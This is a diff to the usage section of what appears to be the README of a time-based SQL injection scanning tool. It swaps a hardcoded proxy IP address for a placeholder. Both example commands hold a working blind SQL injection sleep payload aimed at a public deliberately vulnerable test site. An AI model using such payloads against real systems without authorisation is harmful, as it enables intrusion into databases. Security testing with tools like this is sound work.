@@ -75,11 +75,11 @@ OR
     
     <br>
     
-    Ex 3 - `echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5 --proxy "http://179.67.16.10:8081"`
+    Ex 3 - `echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5 --proxy "http://ip:port"`
     
     <br>
     
-    Ex 4 - `echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5 --proxy "http://179.67.16.10:8081" -H "User-Agent: xxxx"`
+    Ex 4 - `echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5 --proxy "http://ip:port" -H "User-Agent: xxxx"`
     
     <br>
     
